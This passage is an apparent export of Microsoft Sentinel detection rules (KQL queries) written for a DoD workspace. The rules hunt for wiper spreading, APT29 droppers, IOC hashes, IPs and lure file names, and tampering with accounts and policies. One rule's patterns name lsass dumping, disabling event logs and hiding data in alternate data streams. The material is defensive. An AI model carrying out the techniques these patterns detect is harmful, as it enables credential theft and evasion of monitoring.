signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project TimeGenerated, \r\nBehavior = \"Hermetic Wizard WMI spreader\", \r\nProcessCommandLine, \r\nAccountName, \r\nAccountDomain,\r\nUserPrincipalName, \r\nUserDisplayName,\r\nDeviceName, \r\nDeviceId\r\n)\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserPrincipalName"},{"identifier":"DisplayName","columnName":"UserDisplayName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"}]}],"tactics":[],"techniques":[],"displayName":"BAH_HermeticWizard","enabled":true,"description":"HermeticWizard: spreads HermeticWiper across a local network via WMI and SMB https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/","alertRuleTemplateName":null,"lastModifiedUtc":"2023-05-11T13:32:23.2188409Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aa71f645-a8f5-4cc2-afff-22e0c9d46511","name":"aa71f645-a8f5-4cc2-afff-22e0c9d46511","etag":"\"87009997-0000-2700-0000-66fdc57b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\n// Description:\n// Based on attachment from DTO 22-0106\n// looks for Trello based MD5 activity\n// False Positives: No known false positives\nlet MD5list = dynamic([@'a0b4e7622728c317f37ae354b8bc3dbb']);\n(union isfuzzy=true\n(DeviceEvents\n| where MD5 != \"\"\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, MD5, InitiatingProcessMD5, AccountName, AccountDomain, DeviceName, DeviceId\n),\n(DeviceFileEvents\n| where MD5 != \"\"\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, MD5, InitiatingProcessMD5, DeviceName, DeviceId\n),\n(DeviceImageLoadEvents\n| where MD5 != \"\"\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, MD5, InitiatingProcessMD5, DeviceName, DeviceId\n),\n(DeviceProcessEvents\n| where MD5 != \"\"\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, MD5, InitiatingProcessMD5, AccountName, AccountDomain, DeviceName, DeviceId\n),\n(DeviceLogonEvents\n| where InitiatingProcessMD5 != \"\"\n| where InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, InitiatingProcessMD5, AccountName, AccountDomain, DeviceName, DeviceId\n),\n(DeviceRegistryEvents\n| where InitiatingProcessMD5 != \"\"\n| where InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, InitiatingProcessMD5, DeviceName, DeviceId\n),\n(DeviceNetworkEvents\n| where InitiatingProcessMD5 != \"\"\n| where InitiatingProcessMD5 has_any (MD5list)\n| project TimeGenerated, ActionType, InitiatingProcessMD5, DeviceName, DeviceId\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AccountName"},{"identifier":"NTDomain","columnName":"AccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_Trello_MD5_Hash","enabled":true,"description":"This analytic will check MD5 Hash IOC in the Trello malicious first-stage downloader used by Russian Foreign Intelligence Service.\nPLATFORM:Microsoft 365,Windows\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:13:10.1265238Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/692c23f5-44e5-4a1b-876d-e705d69d2448","name":"692c23f5-44e5-4a1b-876d-e705d69d2448","etag":"\"87005394-0000-2700-0000-66fdc5520000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\n// Description:\n// Based on attachment from DTO 22-0106\n// looks for Trello based URL activity\n// False Positives: No known false positives\nlet urlparts = dynamic([@'1/members/me/boards?'\n@'1/boards/'\n@'/lists?key='\n@'1/cards?key='\n@'/cards?key='\n@'attachments?key='\n]);\n(union isfuzzy=true\n(DeviceEvents\n| where FileOriginUrl has_all(urlparts) or RemoteUrl has_all(urlparts)\n| project TimeGenerated, ActionType, FileOriginUrl, RemoteUrl, AccountName, AccountDomain, DeviceName, DeviceId\n),\n(DeviceNetworkEvents\n| where RemoteUrl has_all(urlparts)\n| project TimeGenerated, ActionType, RemoteUrl, DeviceName, DeviceId\n),\n(DeviceFileEvents\n| where FileOriginUrl has_all(urlparts) or FileOriginReferrerUrl has_all(urlparts)\n| project TimeGenerated, ActionType, FileOriginUrl, FileOriginReferrerUrl, DeviceName, DeviceId\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_Trello_URL","enabled":true,"description":"This analytic will check URL IOC's used in the Trello malicious first-stage downloader by Russian Foreign Intelligence Service.\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:12:33.0163194Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/17fc2e82-18b3-4c26-91cd-2ec7c806ddeb","name":"17fc2e82-18b3-4c26-91cd-2ec7c806ddeb","etag":"\"87005dea-0000-2700-0000-66fdcb1c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let MD5list = dynamic(['c6cd8cc573735f3698801c70f699db63',\r\n'7d20fa01a703afa8907e50417d27b0a4',\r\n'b4f0ca61ab0c55a542f32bd4e66a7dc2',\r\n'47390b552d27675d9868ad773d1f199d']);\r\n(union isfuzzy=true\r\n(DeviceEvents\r\n| where MD5 != \"\"\r\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, MD5, InitiatingProcessMD5, AccountCustomEntity = AccountName, AccountDomain, DeviceName, DeviceId\r\n),\r\n(DeviceFileEvents\r\n| where MD5 != \"\"\r\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, MD5, InitiatingProcessMD5, HostCustomEntity = DeviceName, DeviceId\r\n),\r\n(DeviceImageLoadEvents\r\n| where MD5 != \"\"\r\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, MD5, InitiatingProcessMD5, HostCustomEntity = DeviceName, DeviceId\r\n),\r\n(DeviceProcessEvents\r\n| where MD5 != \"\"\r\n| where MD5 has_any (MD5list) or InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, MD5, InitiatingProcessMD5, AccountCustomEntity = AccountName, AccountDomain, HostCustomEntity = DeviceName, DeviceId\r\n),\r\n(DeviceLogonEvents\r\n| where InitiatingProcessMD5 != \"\"\r\n| where InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, InitiatingProcessMD5, AccountCustomEntity = AccountName, AccountDomain, HostCustomEntity = DeviceName, DeviceId\r\n),\r\n(DeviceRegistryEvents\r\n| where InitiatingProcessMD5 != \"\"\r\n| where InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, InitiatingProcessMD5, HostCustomEntity = DeviceName, DeviceId\r\n),\r\n(DeviceNetworkEvents\r\n| where InitiatingProcessMD5 != \"\"\r\n| where InitiatingProcessMD5 has_any (MD5list)\r\n| project TimestampCustomEntity = TimeGenerated, ActionType, InitiatingProcessMD5, HostCustomEntity = DeviceName, DeviceId\r\n)\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"},{"identifier":"NTDomain","columnName":"AccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["ResourceDevelopment"],"techniques":["T1587"],"displayName":"BAH_DTO22_0111","enabled":true,"description":"Detects Golang dropper used by Russian Foreign Intelligence Service (SVR), APT29. This dropper decrypts and then executes a CobaltStrike beacon. The yara rule specifically detects the main function called as it locates the payload in the .rdata section\nPLATFORM:Windows\nMITRE:TA0042;T1587","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:37:15.7359778Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7c656470-c98e-40e6-bbb7-54d84afd243d","name":"7c656470-c98e-40e6-bbb7-54d84afd243d","etag":"\"8700dca9-0000-2700-0000-66fdc6ae0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Stephen Rowley\n//Description: Will track tenant-level change to SharePoint sharing settings.\n//False Positives: This analytic could alert on legitimate changes, but should be investigated anyway to confirm.\nOfficeActivity\n| where Operation == \"SharingPolicyChanged\"\n| where ItemType == \"Tenant\"\n| project TimeGenerated, UserId, ClientIP, ItemType, EventSource, ModifiedProperties\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation","DefenseEvasion","Impact"],"techniques":["T1566","T1078","T1550","T1531"],"displayName":"BAH_SPO_SharingSettings","enabled":true,"description":"Will track tenant-level change to SharePoint sharing settings\nPLATFORM:Microsoft 365,Windows\nMITRE:TA0009;T1213;T1530","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:18:21.6060765Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/10a11691-17c9-4658-b267-c695eb04ae08","name":"10a11691-17c9-4658-b267-c695eb04ae08","etag":"\"87009e5c-0000-2700-0000-66fdc1e10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// This query looks for users that have been disabled in the past 90 days. It then looks at login attempts on those accounts\r\n// greater than seven days after being disabled. It then filters out DoD IPs to show only private IP addresses attempting to login to disabled accounts.\r\nlet mainTimeFrame = 1d;\r\nlet disabledTimeFrame = 90d;\r\nlet main=SigninLogs\r\n    | where TimeGenerated >= ago(mainTimeFrame)\r\n    // Looks at user accounts that start with disable\r\n    | where UserPrincipalName startswith \"disable\"\r\n    // rename to disabledName\r\n    | project-rename disabledName = UserPrincipalName\r\n    // splits the disable out of the name to look up the non disable account to see if it has since been enabled\r\n    | extend enabledName = tostring(split(disabledName, \"disable.\")[1])\r\n    // creates count for next count filter\r\n    | summarize min(TimeGenerated), max(TimeGenerated), count() by disabledName, enabledName, IPAddress\r\n    // join IdentityInfo to lookup if the user has been enabled\r\n    | join kind=leftouter (IdentityInfo\r\n        | where TimeGenerated >= ago(mainTimeFrame)\r\n        | summarize max(TimeGenerated), IsAccountEnabled =make_set(IsAccountEnabled, 1) by AccountUPN)\r\n        on $left.enabledName == $right.AccountUPN\r\n    | extend IsAccountEnabled = IsAccountEnabled[0]\r\n    // tag false if not true\r\n    | extend IsAccountEnabled = iif(isempty(IsAccountEnabled), \"false\", IsAccountEnabled)\r\n    // remove entries where the user has been enabled\r\n    | where IsAccountEnabled != \"true\"\r\n;\r\n// Create list of disabledNamess\r\nlet userlist = main\r\n    | summarize userlist=make_set(disabledName, 100);\r\n// Gets the date of when the account was disabled\r\nlet getDisabledDate=\r\n    AuditLogs\r\n    | where TimeGenerated >= ago(disabledTimeFrame)\r\n    | where OperationName == \"Disable account\"\r\n    | extend user = TargetResources[0]['userPrincipalName']\r\n    | where ['user'] in (userlist)\r\n    | summarize DisabledDate =max(TimeGenerated) by tostring(['user']);\r\n// joins the main analytic with the disabled date\r\nmain\r\n| join kind=innerunique (getDisabledDate) on $left.disabledName == $right.user\r\n// finds where the disabled account has attempted login more than seven days after being disabled\r\n| where datetime_diff( \"day\", max_TimeGenerated, DisabledDate) > 7\r\n// Removes DoD IP addresses as they would need to be onsite since their VPN would not work with a disabled account\r\n| where IPAddress !startswith \"140.\"\r\n| project\r\n    enabledName,\r\n    IsAccountEnabled,\r\n    disabledName,\r\n    IPAddress,\r\n    DisabledDate,\r\n    Count = count_,\r\n    FirstAttemptAtDisabledLogin = min_TimeGenerated,\r\n    LatestAttemptAtDisabledLogin = max_TimeGenerated\r\n| sort by DisabledDate asc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"disabledName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"enabledName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"DisabledAccountLoginAttemptFromNon-DoDIP","enabled":true,"description":"This analytic looks at the passed 24 hours to find disabled account logon attempts. It then looks up the disabled account to see when it was disabled. If the account was disabled greater than 7 days ago, it will check to see if the IP Address is a DoD IP address. If it is not, it will generate an event. \nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0007;T1087;T1087.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:57:50.9079186Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f96c6faf-68de-4e69-911f-b52d2eafdee0","name":"f96c6faf-68de-4e69-911f-b52d2eafdee0","etag":"\"8600a829-0000-2700-0000-66fdafde0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"find\r\n    in (Device*) where * has \"C:\\\\:\" // This looks to find commandline that is using alternate data streams in cmd\r\n    or (\"-Stream \" and \"powershell\")  // This looks to find poweshell command with the -Stream parameter which indicates alternate data stream\r\n    or \"lsass.dmp\"                   // This looks to find cases where the lsass has been dumped\r\n    or \"//hide\"                      // This looks to find cases where a tool may have been used to hide data inside another file\r\n    or (\"wevtutil.exe set-log\" and \"/enabled:false\")  // This looks for commandline that sets a Windows Event type to enabled:false\r\n    or \"disablerestrictedadmin\"      // This looks to find commandline that disables restricted admin, potentially on RDP\r\n| project-reorder *","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"Type"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"Type"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"Type"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"Type"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","Exfiltration","Persistence"],"techniques":[],"displayName":"Suspicious Device Commandline Action","enabled":true,"description":"This analytic looks through device commandline for evidence of alternate data streams, disabling of event logs and lsass dumps.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:40:58.2869618Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/cf34554c-47b7-4770-b89d-9452089c9ce8","name":"cf34554c-47b7-4770-b89d-9452089c9ce8","etag":"\"8500d8d1-0000-2700-0000-66fdab9f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// This query is to indicate when an account is added and then quickly deleted\r\n// get all users added between 14 and 1 days ago\r\nlet getaddeduserspast14d =AuditLogs\r\n    | where TimeGenerated between (ago(14d) .. ago(1d))\r\n    | where OperationName == \"Add user\"\r\n    | extend userinfo = todynamic(TargetResources)[0]\r\n    | extend UserName = userinfo['userPrincipalName']\r\n    | extend UserId = tostring(userinfo['id'])\r\n    // | where UserName !has \".mbx.\" and UserName !startswith \"disable\"\r\n    | project-away userinfo\r\n;\r\n// get all deleted user accounts in the past 1 day\r\nlet getdeleteduserspast24h = AuditLogs\r\n    | where TimeGenerated >= ago(1d)\r\n    | where OperationName == \"Delete user\"\r\n    | extend userinfo = todynamic(TargetResources)[0]\r\n    | extend UserId = tostring(replace_regex(tostring(userinfo['id']), '-', ''))\r\n    | extend UserName = tostring(split(userinfo['userPrincipalName'], UserId)[1])\r\n    | project-away userinfo\r\n;\r\n// make a set from the deleted users\r\nlet deleteduser = getdeleteduserspast24h\r\n    | summarize make_set(UserId)\r\n;\r\n// make a set of the added users\r\nlet addeduser = getaddeduserspast14d\r\n    | summarize make_set(UserId)\r\n;\r\n// finally, get the deleted user logs from users that were added between 14 and 1 day ago\r\ngetdeleteduserspast24h\r\n| extend\r\n    AdditionalDetails = tostring(AdditionalDetails),\r\n    InitiatedBy = tostring(InitiatedBy),\r\n    TargetResources = tostring(TargetResources)\r\n| distinct *\r\n| sort by UserName asc\r\n| where UserId in (addeduser)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatedBy"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"User Account Added Then Deleted Shortly After","enabled":true,"description":"This analytic searches for all user accounts created between the last day and the last 14 days. Then searches those accounts to see if they've been deleted in the past 24 hours. This may find evidence of covering tracks.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:22:54.5034449Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e8b722d1-4ed7-478c-a1be-fa89d1722152","name":"e8b722d1-4ed7-478c-a1be-fa89d1722152","etag":"\"8700fea3-0000-2700-0000-66fdc64a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT5M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Author: Stephen Rowley\r\n//Description: A series of conditional access policies are configured upon initial tenant configuration. These should either never change or only be changed rarely and likely never deleted. This analytic will look for update and delete operations to a list of conditional access policies. The prefix \"TCG-\" is used to target the policies by displayname.\r\n//False Positives: Can alert on legitimate changes to conditional access policies, but should still be investigated to confirm as these changes should be rare.\r\nAuditLogs\r\n| where OperationName in ('Update policy', 'Delete policy')\r\n| where Category == \"Policy\"\r\n| extend initiatedByUser = parse_json(InitiatedBy).user.userPrincipalName\r\n| mv-apply CAPolicyName = todynamic(TargetResources) on (where CAPolicyName has \"displayName\" | extend CAPolicyName = CAPolicyName['displayName'])\r\n| where CAPolicyName startswith \"TCG\" or CAPolicyName startswith \"v2-TCG\"\r\n| summarize CAPolicyName = make_list(CAPolicyName, 10) by TimeGenerated, tostring(initiatedByUser), OperationName, Result\r\n//MITRE\r\n//Defense Evasion TA0005\r\n//Impair Defenses T1562\r\n//Modify Authentication Process T1556","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"initiatedByUser"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"CAPolicyName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1556","T1562"],"displayName":"BAH_TCG-ConditionalAccessPolicyChanges","enabled":true,"description":"A series of conditional access policies are configured upon initial tenant configuration. These should either never change or only be changed rarely and likely never deleted. This analytic will look for update and delete operations to a list of conditional access policies. The prefix \"TCG-\" is used to target the policies by displayname.\n\nModify Authentication Process (T1556), Impair Defenses(T1562): T1562.001\nPLATFORM:Azure AD,Windows,Microsoft 365\nMITRE:TA0005;T1556;T1556.006;T1556.007;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:16:41.3339334Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2aa7d6b3-a8e7-4cd1-8bce-20410abc51d9","name":"2aa7d6b3-a8e7-4cd1-8bce-20410abc51d9","etag":"\"860011a0-0000-2700-0000-66fdb60d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let IPsuspect = dynamic([\"92.204.160.114\", \"46.102.152.102\", \"89.44.9.189\", \"178.132.7.118\", \"185.236.203.153\", \"37.120.237.251\", \"91.241.19.21\", \"146.70.41.157\", \"45.135.232.131\", \"84.252.95.225\",\"89.44.9.108\",\"5.254.118.226\",\"37.120.247.199\",\"69.46.15.151\",\"37.120.237.251\",\"146.70.101.97\",\"146.70.24.173\",\"188.241.83.61\",\"185.244.213.64\",\"45.42.201.248\", \"216.230.232.134\",\"46.102.152.102\",\"146.70.53.153\",\"146.70.88.119\",\"37.221.113.115\",\"92.204.160.114\",\"92.204.160.101\"]);\r\nlet Filesuspect = dynamic([\"Optumrx-Quantity-Limit-Prior-Authorization-Form.exe\", \r\n\"Fedex-Domestic-Air-Waybill.exe\", \r\n\"Osha-Required-Training-Checklist-For-General-Industry.exe\", \r\n\"Thetford Porta Potti 345 Instructions.exe\", \r\n\"Parkland-Heritage-Gazebo-Instructions.exe\", \r\n\"Howard-County-Refinance-Affidavit.exe\", \r\n\"Checklist-For-Bringing-New-Baby-Home.exe\", \r\n\"Pool-Cover-Cable-Winch-Instructions.exe\", \r\n\"Radiation-Pregnancy-Consent-Form.exe\", \r\n\"Rival-Frozen-Delights-Ice-Cream-Maker-Manual.exe\", \r\n\"Ford-Direct-Window-Sticker-Lookup.exe\", \r\n\"Sentence-Structure-Simple-Compound-Complex-Worksheets.exe\", \r\n\"Adrenal-Protocol-Ct-Washout.exe\", \r\n\"Osha-Propane-Tank-Storage-Requirements.exe\", \r\n\"Indiana-Alcohol-And-Tobacco-Liquor-License-Renewal.exe\", \r\n\"Monthly-Elevator-Inspection-Checklist.exe\", \r\n\"Family-Nurse-Practitioner-Certification-Exam-Questions.exe\", \r\n\"Iai-Latent-Print-Certification-Test-Preparation-Training.exe\", \r\n\"Cornwall-Ontario-Pool-Bylaw.exe\", \r\n\"State-Of-Michigan-Workmans-Comp-Waiver.exe\", \r\n\"Lilly-Cares-Patient-Assistance-Application-Form.exe\", \r\n\"Market-Adjustment-Salary-Increase-Letter.exe\", \r\n\"Are-Doctors-Obligated-By-Law-To-Perform-A-Surgery.exe\", \r\n\"Affidavit-Of-Correction-South-Carolina.exe\", \r\n\"Medicare-Annual-Wellness-Visit-Questionnaire-In-Spanish.exe\", \r\n\"Acceptance-Letter-Phd-Neuroscience.exe\", \r\n\"Cigna-Precertification-Request-Form.exe\", \r\n\"Oregon-Inheritance-Tax-Waiver-Form.exe\", \r\n\"Religious-Exemption-Letter-Nj-Example.exe\", \r\n\"Training-Needs-Analysis-Questionnaire-For-Employees.exe\", \r\n\"Sample-Texas-Will-And-Testament.exe\", \r\n\"Matter-As-Particles-Worksheet.exe\", \r\n\"Sdlc-Life-Cycle-With-Examples.exe\", \r\n\"Randall-High-School-Volleyball-Schedule.exe\", \r\n\"Uses-Of-Rocks-Worksheet.exe\", \r\n\"Sample-Demand-Letter-For-Services-Not-Rendered.exe\", \r\n\"Fe-Exam-Review-Lecture-Notes.exe\", \r\n\"Quit-Claim-Deed-Form-Volusia-County-Florida.exe\", \r\n\"Imsa-Ite-Traffic-Signal-Maintenance-Handbook.exe\", \r\n\"Capital-One-Mortgage-Pre-Approval.exe\", \r\n\"Field-Trip-Reflection-Worksheet-Pdf.exe\", \r\n\"Livingston-Mt-City-Court-Warrants-List.exe\", \r\n\"One-Page-Lease-Agreement-Texas.exe\", \r\n\"Thetford Porta Potti 345 Instructions.exe\", \r\n\"Howard-County-Refinance-Affidavit.exe\", \r\n\"Checklist-For-Bringing-New-Baby-Home.exe\", \r\n\"Example Of Discharge Summary For Substance Abuse\"]);\r\nlet Hashsuspect = dynamic([\"af1e952b5b02ca06497e2050bd1ce8d17b9793fdb791473bdae5d994056cb21f\", \r\n\"b4878d6b9d7462cafe81d20da148a44750aa707f4e34eae1f23f21f9e0d9afa0\", \r\n\"3b79aab07b9461a9d4f3c579555ee024888abcda4f5cc23eac5236a56bf740c7\", \r\n\"d40da05d477f2a6a0da575194dd9a693f85440e6b2d08d1687e1415ce0b00df7\", \r\n\"b90ac9da590ba7de19414b7ba6fbece13ba0c507f1d6be2be2b647091f5779f0\", \r\n\"e91e49fa225b2a9d7b6d5b33a64d4ebe96bbbcea3705438910a5196e0b9d030f\", 